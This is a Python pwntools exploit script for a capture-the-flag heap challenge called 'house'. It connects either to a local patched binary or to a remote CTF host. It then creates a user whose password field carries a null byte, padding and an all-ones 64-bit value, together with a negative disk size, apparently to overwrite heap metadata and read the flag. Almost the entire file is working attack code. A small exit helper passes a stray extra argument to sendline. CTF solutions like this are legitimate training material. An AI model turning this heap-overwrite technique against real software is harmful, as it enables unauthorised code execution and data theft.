#!/usr/bin/env python3

from pwn import *
import time
import sys

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('house_patched')
		if debug:
			gdb.attach(s, gdbscript='''
            b* 0x0000000000400924
            c
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('house.nc.jctf.pro', 1337)

	return s

s = conn()

elf = ELF('house_patched')
# libc = ELF('libc.so.6')


def create(user, passwd, size):
    s.sendlineafter(b'>>  ', b'1')
    s.sendlineafter(b'Enter username: ', user)
    s.sendlineafter(b'Enter password: ', passwd)
    s.sendlineafter(b'Enter disk space: ', str(size).encode())
    
def read_flag():
    s.sendlineafter(b'>> ', b'2')

def exit():
    return s.sendline(b'>> ', b'3')


create(b'a'*10, b'root' + b'\0' + b'a'*(0x18-5) +p64(0xffffffffffffffff), '-152')

read_flag()
s.recvline()

print(s.recvuntil(b'}'))
pause()

s.interactive()

